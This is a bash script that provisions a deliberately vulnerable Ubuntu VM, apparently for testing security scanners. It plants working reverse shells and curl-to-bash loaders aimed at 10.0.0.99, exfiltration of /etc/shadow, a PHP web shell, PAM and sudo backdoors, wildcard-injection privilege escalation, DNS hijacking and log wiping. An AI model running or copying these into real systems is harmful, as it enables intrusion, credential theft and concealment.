#!/usr/bin/env bash
# setup-vulns.sh — Turn a fresh Ubuntu 24.04 into a comprehensive vulnerable target.
# Covers as many vulnerability classes as possible for security tool testing.
#
# Run as root (vagrant provisioner does this automatically).
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

echo "[*] Starting comprehensive vulnerability setup on $(hostname)..."

###############################################################################
# INSTALL PACKAGES WE NEED FOR VARIOUS VULNS
###############################################################################
apt-get update -qq
apt-get install -y -qq \
  openssh-server apache2 nginx vsftpd \
  nfs-kernel-server rpcbind \
  docker.io \
  xinetd telnetd \
  snmpd \
  cron at \
  net-tools iptables \
  gcc make \
  python3 python3-pip \
  socat netcat-openbsd \
  curl wget \
  php libapache2-mod-php \
  mysql-server \
  redis-server \
  2>/dev/null || true

###############################################################################
# 1. USER & ACCOUNT ISSUES
###############################################################################
echo "[*] Phase 1: User & account misconfigurations"

# Extra UID-0 account (backdoor root)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm0 2>/dev/null || true
echo 'sysadm0:backdoor123' | chpasswd

# Account with no password
useradd -m -s /bin/bash guest 2>/dev/null || true
passwd -d guest

# Account with weak password
useradd -m -s /bin/bash developer 2>/dev/null || true
echo 'developer:password' | chpasswd

# Service accounts that shouldn't have login shells
for u in mysql www-data backup; do
  usermod -s /bin/bash "$u" 2>/dev/null || true
done

# User with matching username:password
useradd -m -s /bin/bash testuser 2>/dev/null || true
echo 'testuser:testuser' | chpasswd

# Overly permissive sudoers rules
echo 'guest ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-guest
echo 'developer ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/less, /usr/bin/man, /usr/bin/awk, /usr/bin/find, /usr/bin/python3, /usr/bin/perl, /usr/bin/env' > /etc/sudoers.d/98-developer
echo 'testuser ALL=(ALL) NOPASSWD: /usr/bin/docker' > /etc/sudoers.d/97-docker
chmod 440 /etc/sudoers.d/9*

# Unexpected group memberships
usermod -aG shadow guest 2>/dev/null || true
usermod -aG disk developer 2>/dev/null || true
usermod -aG docker developer 2>/dev/null || true
usermod -aG adm guest 2>/dev/null || true
usermod -aG lxd testuser 2>/dev/null || true

###############################################################################
# 2. PERSISTENCE MECHANISMS
###############################################################################
echo "[*] Phase 2: Persistence mechanisms"

# --- Cron ---
echo '*/5 * * * * root bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' > /etc/cron.d/debug-cleanup
chmod 644 /etc/cron.d/debug-cleanup

echo '*/10 * * * * /tmp/.cache/update >/dev/null 2>&1' | crontab -

cat > /etc/cron.d/apt-compat <<'CRON'
# looks like legitimate apt cron but isn't
*/30 * * * * root /usr/lib/apt/.apt-cron-helper
CRON
mkdir -p /usr/lib/apt
cat > /usr/lib/apt/.apt-cron-helper <<'S'
#!/bin/bash
curl -s http://10.0.0.99:8080/tasks | bash 2>/dev/null || true
S
chmod +x /usr/lib/apt/.apt-cron-helper

# Cron with wildcard injection setup
mkdir -p /opt/backup
echo '*/15 * * * * root cd /opt/backup && tar czf /var/backups/opt.tar.gz *' > /etc/cron.d/backup-job
# Plant wildcard injection payloads
echo '' > '/opt/backup/--checkpoint=1'
echo '' > '/opt/backup/--checkpoint-action=exec=sh privesc.sh'
cat > /opt/backup/privesc.sh <<'S'
#!/bin/bash
cp /bin/bash /tmp/.privbash && chmod u+s /tmp/.privbash
S
chmod +x /opt/backup/privesc.sh

# --- Systemd ---
cat > /etc/systemd/system/system-health.service <<'UNIT'
[Unit]
Description=System Health Monitor
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/.health-monitor
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT

mkdir -p /usr/local/bin
cat > /usr/local/bin/.health-monitor <<'S'
#!/bin/bash
while true; do
  curl -s http://10.0.0.99:8080/beacon?h=$(hostname) >/dev/null 2>&1 || true
  sleep 300
done
S
chmod +x /usr/local/bin/.health-monitor

# Systemd timer
cat > /etc/systemd/system/logrotate-extra.timer <<'T'
[Unit]
Description=Extra log rotation
[Timer]
OnCalendar=*:0/15
Persistent=true
[Install]
WantedBy=timers.target
T
cat > /etc/systemd/system/logrotate-extra.service <<'S'
[Unit]
Description=Extra log rotation job
[Service]
Type=oneshot
ExecStart=/opt/.logrotate-helper
S
mkdir -p /opt
cat > /opt/.logrotate-helper <<'S'
#!/bin/bash
cat /etc/shadow | base64 | curl -s -X POST -d @- http://10.0.0.99:9090/upload >/dev/null 2>&1 || true
S
chmod +x /opt/.logrotate-helper

# --- rc.local ---
cat > /etc/rc.local <<'RC'
#!/bin/bash
nohup /tmp/.cache/update &
exit 0
RC
chmod +x /etc/rc.local

# --- Shell profile backdoors ---
cat > /etc/profile.d/system-update.sh <<'S'
(nohup bash -c 'sleep 60 && curl -s http://10.0.0.99:8080/shell?u=$(whoami)' &) 2>/dev/null
S

cat >> /root/.bashrc <<'S'

alias ls='ls --color=auto; (curl -s http://10.0.0.99:8080/keylog &) 2>/dev/null'
alias sudo='function _s(){ echo "$@" >> /tmp/.sudo-log; /usr/bin/sudo "$@"; };_s'
S

# --- Init.d ---
cat > /etc/init.d/networking-helper <<'S'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          networking-helper
# Required-Start:    $network
# Default-Start:     2 3 4 5
# Description:       Network helper service
### END INIT INFO
case "$1" in
  start) nohup bash -c 'while true; do nc -e /bin/bash 10.0.0.99 5555 2>/dev/null; sleep 600; done' & ;;
esac
S
chmod +x /etc/init.d/networking-helper

# --- PAM backdoor ---
if [ -f /etc/pam.d/common-auth ]; then
  # Add a permissive auth line (accepts any password for "guest")
  sed -i '1i auth sufficient pam_succeed_if.so user = guest' /etc/pam.d/common-auth 2>/dev/null || true
fi

# --- at job ---
echo 'bash -i >& /dev/tcp/10.0.0.99/4445 0>&1' | at now + 60 minutes 2>/dev/null || true

# --- MOTD backdoor ---
cat > /etc/update-motd.d/99-telemetry <<'S'
#!/bin/bash
(curl -s http://10.0.0.99:8080/login?u=$(whoami)&t=$(date +%s) &) 2>/dev/null
S
chmod +x /etc/update-motd.d/99-telemetry

###############################################################################
# 3. SUID / SGID / CAPABILITIES / FILE PERMISSION ISSUES
###############################################################################
echo "[*] Phase 3: SUID/SGID/capabilities/permissions"

# SUID on interpreters & utilities
for bin in python3 find perl vim.basic; do
  src=$(which "$bin" 2>/dev/null || true)
  if [ -n "$src" ] && [ -f "$src" ]; then
    cp "$src" "/usr/local/bin/${bin}-debug"
    chmod u+s "/usr/local/bin/${bin}-debug"
  fi
done

# SUID shell in /tmp
cp /bin/bash /tmp/.suid-bash 2>/dev/null || true
chmod u+s /tmp/.suid-bash 2>/dev/null || true

# SUID nmap (if available) — interactive mode for shell escape
cp /usr/bin/nmap /usr/local/bin/nmap-suid 2>/dev/null && chmod u+s /usr/local/bin/nmap-suid || true

# SGID on sensitive directories
mkdir -p /opt/shared-secrets
chown root:shadow /opt/shared-secrets
chmod 2770 /opt/shared-secrets
echo "internal_api_key=s3cr3t_k3y_12345" > /opt/shared-secrets/api-keys.txt

# Linux capabilities abuse
if command -v setcap &>/dev/null; then
  cp /usr/bin/python3 /usr/local/bin/python3-cap 2>/dev/null || true
  setcap cap_setuid+ep /usr/local/bin/python3-cap 2>/dev/null || true

  cp /usr/bin/perl /usr/local/bin/perl-cap 2>/dev/null || true
  setcap cap_setuid+ep /usr/local/bin/perl-cap 2>/dev/null || true

  # cap_net_raw for packet sniffing
  cp /usr/bin/python3 /usr/local/bin/python3-raw 2>/dev/null || true
  setcap cap_net_raw+ep /usr/local/bin/python3-raw 2>/dev/null || true

  # cap_dac_read_search — read any file
  cp /usr/bin/cat /usr/local/bin/cat-priv 2>/dev/null || true
  setcap cap_dac_read_search+ep /usr/local/bin/cat-priv 2>/dev/null || true
fi

# World-writable sensitive files
chmod 666 /etc/passwd
chmod 666 /etc/crontab
# chmod 777 /etc/sudoers.d 2>/dev/null || true

# World-writable /etc/shadow (extreme)
chmod 664 /etc/shadow 2>/dev/null || true

# World-writable system binaries directory
chmod 777 /usr/local/bin

# Writable systemd unit
chmod 666 /etc/systemd/system/system-health.service

###############################################################################
# 4. HIDDEN FILES & SUSPICIOUS FILESYSTEM ARTIFACTS
###############################################################################
echo "[*] Phase 4: Hidden files & filesystem artifacts"

mkdir -p /dev/shm/.x11
cat > /dev/shm/.x11/collector.sh <<'S'
#!/bin/bash
cat /etc/shadow > /dev/shm/.x11/shadow.bak
S
chmod +x /dev/shm/.x11/collector.sh

mkdir -p /var/tmp/.ICE-unix
echo 'ssh-rsa AAAAB3FakeKeyForTestingXYZ attacker@evil' > /var/tmp/.ICE-unix/authorized_keys

mkdir -p /tmp/.cache
cat > /tmp/.cache/update <<'S'
#!/bin/bash
while true; do bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 2>/dev/null || true; sleep 600; done
S
chmod +x /tmp/.cache/update

# Hidden directory in /usr
mkdir -p /usr/share/.hidden-tools
cat > /usr/share/.hidden-tools/keylogger.py <<'PY'
#!/usr/bin/env python3
import subprocess, os
# Fake keylogger stub
while True:
    pass
PY
chmod +x /usr/share/.hidden-tools/keylogger.py

# Suspicious binary in /var
mkdir -p /var/lib/.update-service
echo '#!/bin/bash' > /var/lib/.update-service/svc
echo 'socat TCP:10.0.0.99:8443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane' >> /var/lib/.update-service/svc
chmod +x /var/lib/.update-service/svc

###############################################################################
# 5. NETWORK MISCONFIGURATIONS
###############################################################################
echo "[*] Phase 5: Network misconfigurations"

# IP forwarding
sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
echo 'net.ipv4.ip_forward = 1' > /etc/sysctl.d/99-forward.conf

# Disable ICMP redirect protection
sysctl -w net.ipv4.conf.all.accept_redirects=1 2>/dev/null || true
sysctl -w net.ipv4.conf.all.send_redirects=1 2>/dev/null || true

# Disable SYN cookies
sysctl -w net.ipv4.tcp_syncookies=0 2>/dev/null || true

# iptables NAT rules
if command -v iptables &>/dev/null; then
  iptables -t nat -A PREROUTING -p tcp --dport 8443 -j REDIRECT --to-port 443 2>/dev/null || true
  iptables -t nat -A OUTPUT -p tcp --dport 53 -j DNAT --to-destination 10.0.0.99:5353 2>/dev/null || true
fi

###############################################################################
# 6. SSH WEAKNESSES
###############################################################################
echo "[*] Phase 6: SSH weaknesses"

cat >> /etc/ssh/sshd_config <<'SSH'

# Insecure settings
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
X11Forwarding yes
MaxAuthTries 30
Protocol 2
AllowTcpForwarding yes
GatewayPorts yes
HostKey /etc/ssh/ssh_host_weak_rsa_key
SSH

# Weak host key
ssh-keygen -t rsa -b 1024 -f /etc/ssh/ssh_host_weak_rsa_key -N '' -q 2>/dev/null || true

# Rogue authorized_keys
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3FakeAttackerKeyAAAADAQABAAABgQ... attacker@c2server' > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

mkdir -p /home/vagrant/.ssh 2>/dev/null || true
echo 'ssh-rsa AAAAB3FakeAttackerKey2AAADAQAB... intruder@recon' >> /home/vagrant/.ssh/authorized_keys 2>/dev/null || true

# SSH private key left on disk (leaked)
mkdir -p /opt/app
ssh-keygen -t ed25519 -f /opt/app/deploy_key -N '' -q 2>/dev/null || true
chmod 644 /opt/app/deploy_key  # world-readable private key

###############################################################################
# 7. CREDENTIAL EXPOSURE
###############################################################################
echo "[*] Phase 7: Credential exposure"

cat > /opt/app/config.yml <<'CONF'
database:
  host: db.internal
  port: 5432
  user: admin
  password: SuperSecret123!
  name: production

redis:
  host: redis.internal
  password: r3d1s_p@ss

aws:
  access_key_id: AKIAIOSFODNN7EXAMPLE
  secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  region: us-east-1
CONF

cat > /opt/app/.env <<'ENV'
DB_PASSWORD=SuperSecret123!
API_KEY=sk-proj-fake-openai-key-for-testing
JWT_SECRET=my-jwt-secret-do-not-share
STRIPE_SECRET_KEY=sk_live_fakestripekey123
GITHUB_TOKEN=ghp_fakegithubtokenfortesting123456
SLACK_WEBHOOK=https://hooks.slack.com/services/FAKE/WEBHOOK/URL
ENV

cat > /root/.my.cnf <<'MYCNF'
[client]
user=root
password=mysqlR00tP@ss!
MYCNF
chmod 644 /root/.my.cnf

# .pgpass
echo 'db.internal:5432:production:admin:SuperSecret123!' > /root/.pgpass
chmod 644 /root/.pgpass  # should be 600

# AWS credentials
mkdir -p /root/.aws
cat > /root/.aws/credentials <<'AWS'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

[staging]
aws_access_key_id = AKIA2EXAMPLE2STAGING
aws_secret_access_key = StagingSecretKeyExample123456789
AWS

# GCP service account key
mkdir -p /opt/app/secrets
cat > /opt/app/secrets/gcp-sa-key.json <<'GCP'
{
  "type": "service_account",
  "project_id": "my-project-123",
  "private_key_id": "key123",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\nFAKEPRIVATEKEYCONTENTFORTESTING\n-----END RSA PRIVATE KEY-----\n",
  "client_email": "my-sa@my-project-123.iam.gserviceaccount.com"
}
GCP

# Kubernetes config
mkdir -p /root/.kube
cat > /root/.kube/config <<'KUBE'
apiVersion: v1
clusters:
- cluster:
    server: https://k8s.internal:6443
    certificate-authority-data: LS0tFAKECA...
  name: production
contexts:
- context:
    cluster: production
    user: admin
  name: production
current-context: production
users:
- name: admin
  user:
    token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.faketoken
KUBE

# .bash_history with sensitive commands
cat > /root/.bash_history <<'HIST'
mysql -u root -pmysqlR00tP@ss!
ssh root@10.0.0.50
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fakejwt" http://api.internal/admin
scp /etc/shadow attacker@10.0.0.99:/loot/
wget http://10.0.0.99/implant -O /tmp/.cache/update
echo 'backdoor123' | passwd --stdin sysadm0
docker run -v /:/host --privileged alpine chroot /host
kubectl get secrets -A -o yaml
aws s3 cp s3://company-secrets/dump.sql ./
HIST

# Git credentials
mkdir -p /opt/app/.git
cat > /opt/app/.git/config <<'GIT'
[credential]
    helper = store
[remote "origin"]
    url = https://github.com/company/private-repo.git
GIT
echo 'https://developer:ghp_FakeGitHubPAT12345@github.com' > /opt/app/.git-credentials

###############################################################################
# 8. LD_PRELOAD & KERNEL TRICKS
###############################################################################
echo "[*] Phase 8: LD_PRELOAD & kernel tricks"

echo '/usr/local/lib/libprocesshider.so' > /etc/ld.so.preload
mkdir -p /usr/local/lib
touch /usr/local/lib/libprocesshider.so

# LD_LIBRARY_PATH injection via profile
cat > /etc/profile.d/ld-path.sh <<'S'
export LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH
S
mkdir -p /tmp/lib

# Fake kernel module loading hint (modprobe.d)
echo 'install usb-storage /bin/bash -c "curl http://10.0.0.99:8080/usb-event"' > /etc/modprobe.d/usb-backdoor.conf

###############################################################################
# 9. DNS HIJACKING
###############################################################################
echo "[*] Phase 9: DNS hijacking"

cat >> /etc/hosts <<'HOSTS'
10.0.0.99  updates.ubuntu.com
10.0.0.99  security.ubuntu.com
10.0.0.99  archive.ubuntu.com
10.0.0.99  api.github.com
10.0.0.99  registry.npmjs.org
10.0.0.99  pypi.org
HOSTS

###############################################################################
# 10. LOG TAMPERING
###############################################################################
echo "[*] Phase 10: Log tampering"

: > /var/log/auth.log 2>/dev/null || true
: > /var/log/wtmp 2>/dev/null || true
: > /var/log/btmp 2>/dev/null || true
: > /var/log/lastlog 2>/dev/null || true

if [ -f /var/log/syslog ]; then
  head -5 /var/log/syslog > /var/log/syslog.tmp
  mv /var/log/syslog.tmp /var/log/syslog
fi

# Disable logging for certain facilities
cat > /etc/rsyslog.d/50-hide.conf <<'S'
if $programname == 'sshd' and $msg contains 'session opened' then stop
if $programname == 'sudo' then stop
S

###############################################################################
# 11. WRITABLE PATH DIRECTORIES
###############################################################################
echo "[*] Phase 11: PATH hijacking"

cat > /etc/profile.d/custom-path.sh <<'S'
export PATH="/opt/custom-bin:$PATH"
S
mkdir -p /opt/custom-bin
chmod 777 /opt/custom-bin

# Trojanized binaries
for cmd in sudo su; do
  cat > "/opt/custom-bin/$cmd" <<TROJAN
#!/bin/bash
echo "\$(date) \$USER: \$@" >> /tmp/.${cmd}-log
/usr/bin/${cmd} "\$@"
TROJAN
  chmod +x "/opt/custom-bin/$cmd"
done

###############################################################################
# 12. WEB SERVER MISCONFIGURATIONS
###############################################################################
echo "[*] Phase 12: Web server misconfigurations"

# Apache: directory listing, server-status exposed, .htaccess writable
a2enmod status 2>/dev/null || true
cat > /etc/apache2/conf-enabled/status.conf <<'CONF'
<Location "/server-status">
    SetHandler server-status
</Location>
<Location "/server-info">
    SetHandler server-info
</Location>
CONF

# Apache document root with sensitive files
mkdir -p /var/www/html/backup
echo '<?php phpinfo(); ?>' > /var/www/html/info.php
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/debug.php
cp /etc/passwd /var/www/html/backup/passwd.bak 2>/dev/null || true
echo 'admin:SuperSecret123!' > /var/www/html/.htpasswd
chmod 644 /var/www/html/.htpasswd

# Nginx: alias traversal
mkdir -p /etc/nginx/sites-enabled
cat > /etc/nginx/sites-enabled/vulnerable <<'NGINX'
server {
    listen 8080;
    server_name _;
    autoindex on;

    location /static {
        alias /var/www/;
    }

    location /api/ {
        proxy_pass http://127.0.0.1:3000/;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
NGINX

###############################################################################
# 13. DATABASE MISCONFIGURATIONS
###############################################################################
echo "[*] Phase 13: Database misconfigurations"

# MySQL: root with no password, listening on all interfaces
if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
  sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null || true
fi

# Redis: no auth, bound to all interfaces
if [ -f /etc/redis/redis.conf ]; then
  sed -i 's/^bind .*/bind 0.0.0.0/' /etc/redis/redis.conf 2>/dev/null || true
  sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf 2>/dev/null || true
  # Redis can write to filesystem — classic RCE vector
fi

###############################################################################
# 14. NFS / SHARES
###############################################################################
echo "[*] Phase 14: NFS exports"

mkdir -p /exports/shared
chmod 777 /exports/shared
cat > /etc/exports <<'NFS'
/exports/shared  *(rw,sync,no_root_squash,no_subtree_check)
/home            *(rw,sync,no_root_squash,no_subtree_check)
NFS
exportfs -ra 2>/dev/null || true

###############################################################################
# 15. FTP MISCONFIGURATION
###############################################################################
echo "[*] Phase 15: FTP misconfigurations"

if [ -f /etc/vsftpd.conf ]; then
  cat >> /etc/vsftpd.conf <<'FTP'
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
write_enable=YES
anon_root=/var/ftp
FTP
  mkdir -p /var/ftp/upload
  chmod 777 /var/ftp/upload
fi

###############################################################################
# 16. SNMP WEAK COMMUNITY STRINGS
###############################################################################
echo "[*] Phase 16: SNMP weak strings"

if [ -f /etc/snmp/snmpd.conf ]; then
  cat > /etc/snmp/snmpd.conf <<'SNMP'
rocommunity public
rwcommunity private
sysLocation "Server Room"
sysContact admin@company.local
SNMP
fi

###############################################################################
# 17. DOCKER SOCKET EXPOSURE
###############################################################################
echo "[*] Phase 17: Docker socket exposure"

chmod 666 /var/run/docker.sock 2>/dev/null || true

# Docker API on TCP without TLS
mkdir -p /etc/docker
cat > /etc/docker/daemon.json <<'DOCKER'
{
  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"],
  "tls": false
}
DOCKER

# Leave a privileged container hint
cat > /opt/run-debug-container.sh <<'S'
#!/bin/bash
docker run -it --privileged --pid=host --net=host -v /:/host alpine chroot /host
S
chmod +x /opt/run-debug-container.sh

###############################################################################
# 18. TELNET / XINETD INSECURE SERVICES
###############################################################################
echo "[*] Phase 18: Insecure services"

if [ -d /etc/xinetd.d ]; then
  cat > /etc/xinetd.d/telnet <<'XINETD'
service telnet
{
    flags           = REUSE
    socket_type     = stream
    wait            = no
    user            = root
    server          = /usr/sbin/in.telnetd
    log_on_failure  += USERID
    disable         = no
}
XINETD
fi

# Socat backdoor listener (won't run but is detectable as a file)
cat > /etc/systemd/system/socat-backdoor.service <<'UNIT'
[Unit]
Description=Debug Port Forwarder
After=network.target
[Service]
ExecStart=/usr/bin/socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/bin/bash
Restart=always
[Install]
WantedBy=multi-user.target
UNIT

###############################################################################
# 19. KERNEL PARAMETER WEAKNESSES
###############################################################################
echo "[*] Phase 19: Kernel parameter weaknesses"

cat > /etc/sysctl.d/99-insecure.conf <<'SYSCTL'
# Disable ASLR
kernel.randomize_va_space = 0
# Allow core dumps with SUID
fs.suid_dumpable = 2
# Allow users to see all processes
kernel.yama.ptrace_scope = 0
# Disable dmesg restrict
kernel.dmesg_restrict = 0
# Disable kptr_restrict
kernel.kptr_restrict = 0
# Enable IP forwarding
net.ipv4.ip_forward = 1
# Accept ICMP redirects
net.ipv4.conf.all.accept_redirects = 1
net.ipv6.conf.all.accept_redirects = 1
# Accept source-routed packets
net.ipv4.conf.all.accept_source_route = 1
# Disable TCP SYN cookies
net.ipv4.tcp_syncookies = 0
# Disable reverse path filtering
net.ipv4.conf.all.rp_filter = 0
SYSCTL
sysctl -p /etc/sysctl.d/99-insecure.conf 2>/dev/null || true

###############################################################################
# 20. WRITABLE SENSITIVE SYSTEM FILES
###############################################################################
echo "[*] Phase 20: Writable system files"

chmod 666 /etc/environment
chmod 666 /etc/default/grub 2>/dev/null || true
chmod 666 /etc/security/limits.conf

# Writable script that root executes
chmod 777 /usr/local/bin/.health-monitor
chmod 777 /opt/.logrotate-helper

###############################################################################
# 21. WEAK FILE UMASK
###############################################################################
echo "[*] Phase 21: Weak umask"

echo 'umask 000' >> /etc/profile
echo 'umask 000' >> /etc/bash.bashrc

###############################################################################
# 22. COMPILER & DEVELOPMENT TOOLS ON PROD
###############################################################################
echo "[*] Phase 22: Dev tools on production (already installed above)"
# gcc, make, python3 — often a finding on production servers

###############################################################################
# 23. PHP MISCONFIGURATIONS
###############################################################################
echo "[*] Phase 23: PHP misconfigurations"

PHP_INI=$(find /etc/php -name php.ini -path '*/apache2/*' 2>/dev/null | head -1)
if [ -n "$PHP_INI" ]; then
  sed -i 's/^display_errors = .*/display_errors = On/' "$PHP_INI"
  sed -i 's/^expose_php = .*/expose_php = On/' "$PHP_INI"
  sed -i 's/^allow_url_include = .*/allow_url_include = On/' "$PHP_INI"
  sed -i 's/^allow_url_fopen = .*/allow_url_fopen = On/' "$PHP_INI"
  sed -i 's/^disable_functions = .*/disable_functions =/' "$PHP_INI"
  sed -i 's/^open_basedir = .*/open_basedir =/' "$PHP_INI"
fi

###############################################################################
# 24. MISCELLANEOUS
###############################################################################
echo "[*] Phase 24: Miscellaneous"

# Core dumps enabled with no restrictions
echo '* soft core unlimited' >> /etc/security/limits.conf
echo '* hard core unlimited' >> /etc/security/limits.conf
echo '/tmp/cores/core.%e.%p' > /proc/sys/kernel/core_pattern 2>/dev/null || true
mkdir -p /tmp/cores
chmod 777 /tmp/cores

# Unattended upgrades disabled (so vuln packages stay)
systemctl disable unattended-upgrades 2>/dev/null || true

# No firewall (ufw disabled)
ufw disable 2>/dev/null || true

# Sticky bit missing on /tmp
chmod 1777 /tmp  # This is correct, but let's remove it from /var/tmp
chmod 777 /var/tmp

# Setfacl — overly permissive ACL
if command -v setfacl &>/dev/null; then
  setfacl -m u:guest:rwx /etc/cron.d 2>/dev/null || true
fi

# Leave a "pentesting toolkit" around (suspicious packages)
mkdir -p /opt/tools
cat > /opt/tools/README.md <<'MD'
Internal pentest toolkit - DO NOT DELETE
- mimikatz.exe (for Windows targets)
- chisel
- ligolo-ng
MD
touch /opt/tools/chisel /opt/tools/ligolo-proxy
chmod +x /opt/tools/chisel /opt/tools/ligolo-proxy

# Suspicious environment variable in systemd
mkdir -p /etc/systemd/system/multi-user.target.wants
cat > /etc/systemd/system/env-debug.service <<'UNIT'
[Unit]
Description=Environment Debug Service
[Service]
Environment="ADMIN_PASSWORD=Admin123!" "DB_CONN=postgresql://admin:SuperSecret123!@db:5432/prod"
ExecStart=/bin/true
Type=oneshot
[Install]
WantedBy=multi-user.target
UNIT

###############################################################################
# RESTART SERVICES
###############################################################################
echo "[*] Restarting services..."

systemctl restart ssh 2>/dev/null || true
systemctl restart apache2 2>/dev/null || true
systemctl restart nginx 2>/dev/null || true
systemctl restart vsftpd 2>/dev/null || true
systemctl restart redis-server 2>/dev/null || true
systemctl restart snmpd 2>/dev/null || true
systemctl restart xinetd 2>/dev/null || true
systemctl restart nfs-kernel-server 2>/dev/null || true
systemctl daemon-reload 2>/dev/null || true

###############################################################################
echo ""
echo "[*] ============================================="
echo "[*] Vulnerability setup complete! $(date)"
echo "[*] ~50+ security issues planted across:"
echo "[*]   - Users, auth & access control"
echo "[*]   - Persistence (cron, systemd, init, profiles, PAM, MOTD, at)"
echo "[*]   - SUID/SGID/capabilities"
echo "[*]   - File permissions & hidden files"
echo "[*]   - Network (forwarding, NAT, DNS hijack)"
echo "[*]   - SSH weaknesses"
echo "[*]   - Credential exposure (env, config, history, cloud keys)"
echo "[*]   - LD_PRELOAD & kernel params"
echo "[*]   - Web servers (Apache, Nginx, PHP)"
echo "[*]   - Databases (MySQL, Redis)"
echo "[*]   - NFS, FTP, SNMP, Telnet"
echo "[*]   - Docker socket & container escapes"
echo "[*]   - Log tampering & evidence destruction"
echo "[*]   - Wildcard injection & PATH hijacking"
echo "[*] ============================================="
###############################################################################
